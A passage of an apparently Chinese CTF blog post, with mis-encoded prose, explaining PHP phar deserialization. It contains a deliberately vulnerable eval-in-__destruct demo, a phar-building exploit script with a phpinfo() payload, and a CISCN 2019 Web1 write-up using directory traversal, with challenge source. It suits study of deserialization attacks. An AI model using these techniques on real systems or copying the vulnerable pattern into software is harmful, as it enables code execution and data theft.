class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">haha</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;func);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file_name</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file_name</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>ä¸Šé¢çš„demoå¹¶æ²¡æœ‰ååºåˆ—åŒ–å…¥å£åªæœ‰ä¸€ä¸ªæ–‡ä»¶åŒ…å«å‡½æ•°<br>EXP<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">haha</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>=<span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">haha</span>();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);  <span class="comment">//ç”Ÿæˆä¸€ä¸ªpharæ–‡ä»¶ï¼Œåå­—ä¸ºphar.phar</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">startBuffering</span>(); <span class="comment">//ä¸‹é¢ç»†è®²</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//è®¾ç½®stubå†…å®¹</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); <span class="comment">//å°†åˆ›å»ºçš„å¯¹è±¡aå†™å…¥åˆ°Metadataä¸­</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;testaaa&quot;</span>); <span class="comment">//æ·»åŠ è¦è¿›è¡Œå‹ç¼©çš„æ–‡ä»¶ï¼Œæ–‡ä»¶åä¸ºtestï¼Œæ–‡ä»¶å†…å®¹ä¸ºtestaaa</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>();<span class="comment">//</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬ç›´æ¥å°†ç”Ÿæˆçš„æ–‡ä»¶æ”¾åˆ°åŒä¸€æ–‡ä»¶å¤¹ä¸‹è¿›è¡Œå®éªŒ<br><img src="/2024/03/20/%E5%88%9D%E6%8E%A2phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png" class=""><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨å®éªŒpharä¼ªåè®®å¯¹pharæ–‡ä»¶å‹ç¼©çš„æ–‡ä»¶è¿›è¡Œè¯»å–æ—¶ä¼šæˆåŠŸååºåˆ—åŒ–.</p><h1 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h1><h2 id="CISCN-2019ååŒ—Day1-Web1"><a href="#CISCN-2019ååŒ—Day1-Web1" class="headerlink" title="[CISCN 2019ååŒ—Day1]Web1"></a>[CISCN 2019ååŒ—Day1]Web1</h2><p>æˆ‘å°±æ˜¯åˆ·åˆ°äº†è¿™é¢˜æ‰èŒç”Ÿäº†å­¦ä¹ pharååºåˆ—åŒ–çš„æƒ³æ³•<br>æˆ‘ä»¬å…ˆè¿›è¡Œæ³¨å†Œ<br>ä¹‹åå‘ç°å¯ä»¥ä¸Šä¼ æ–‡ä»¶,å‘ç°åªèƒ½ä¸Šä¼ ç…§ç‰‡,ä¿®æ”¹ä¸€ä¸‹ MIME ç±»å‹ä¼šå‘ç°å¯ä»¥ç›´æ¥ä¸Šä¼ æˆåŠŸ,ä½†æ˜¯ä¼šè¢«ä¿®æ”¹æˆjpg.ä¸€å¼€å§‹æˆ‘ä»¥ä¸ºæ˜¯æ¡ä»¶ç«äº‰,çœ‹äº†ä¸€ä¸‹wpå‘ç°ä¸æ˜¯,è€Œæ˜¯åœ¨æ–‡ä»¶ä¸‹è½½çš„è·¯ç”±å¯ä»¥è¿›è¡Œç›®å½•ç©¿è¶Š.(å¯¹ç›®å½•ç©¿è¶Šè¿˜æ˜¯ä¸å¤Ÿæ•æ„Ÿä¸‹æ¬¡çœ‹åˆ°ä¸‹è½½å°±è¦æƒ³åˆ°å¯èƒ½å­˜åœ¨ç›®å½•ç©¿è¶Š)æˆ‘ä»¬å°†filenameæ”¹æˆ/var/www/html/download.phpæ¥å¯¹æ–‡ä»¶è¿›è¡Œè¯»å–<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;:/etc:/tmp&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>) &amp;&amp; <span class="title function_ invoke__">stristr</span>(<span class="variable">$filename</span>, <span class="string">&quot;flag&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/octet-stream&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-Disposition: attachment; filename=&quot;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File not exist&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><br>ä¼šå‘ç°è¿™ä¸¤è¡Œä»£ç <br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;:/etc:/tmp&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>) &amp;&amp; <span class="title function_ invoke__">stristr</span>(<span class="variable">$filename</span>, <span class="string">&quot;flag&quot;</span>) === <span class="literal">false</span>) </span><br></pre></td></tr></table></figure><br>getcwd()è¡¨ç¤ºå½“å‰ç¨‹åºç›®å½•å³/var/www/html,<br>å…¶è§„å®šäº†ä¸èƒ½ç›´æ¥è¯»å–flag,åªèƒ½è¯»å–/var/www/html,/etc,/tmpçš„å†…å®¹.å³æˆ‘ä»¬æ— æ³•åœ¨è¿™é‡Œè¯»å–åˆ°æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶.<br>æˆ‘ä»¬å¯ä»¥å‘ç°å…¶å¯¼å…¥äº†class.phpæ–‡ä»¶æˆ‘ä»¬è¿›è¡Œæ–‡ä»¶åŒ…å«.<br>class.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$dbaddr</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;dropbox&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$dbaddr</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db = <span class="variable">$db</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span>(<span class="params"><span class="variable">$username</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">store_result</span>();</span><br><span class="line">        <span class="variable">$count</span> = <span class="variable">$stmt</span>-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$count</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;ss&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_result</span>(<span class="variable">$expect</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$expect</span>) &amp;&amp; <span class="variable">$expect</span> === <span class="variable">$password</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$filenames</span> = <span class="title function_ invoke__">scandir</span>(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;..&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$filenames</span> <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">            <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$path</span> . <span class="variable">$filename</span>);</span><br><span class="line">            <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;files, <span class="variable">$file</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$table</span> = <span class="string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;funcs <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$func</span>) . <span class="string">&#x27;&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;results <span class="keyword">as</span> <span class="variable">$filename</span> =&gt; <span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$value</span>) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$filename</span>) . <span class="string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;æ¶“å¬­æµ‡&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;é’çŠ»æ«&lt;/a&gt;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$table</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) &amp;&amp; !<span class="title function_ invoke__">is_dir</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$size</span> = <span class="title function_ invoke__">filesize</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$units</span> = <span class="keyword">array</span>(<span class="string">&#x27; B&#x27;</span>, <span class="string">&#x27; KB&#x27;</span>, <span class="string">&#x27; MB&#x27;</span>, <span class="string">&#x27; GB&#x27;</span>, <span class="string">&#x27; TB&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$size</span> &gt;= <span class="number">1024</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="number">4</span>; <span class="variable">$i</span>++) <span class="variable">$size</span> /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">round</span>(<span class="variable">$size</span>, <span class="number">2</span>) . <span class="variable">$units</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ 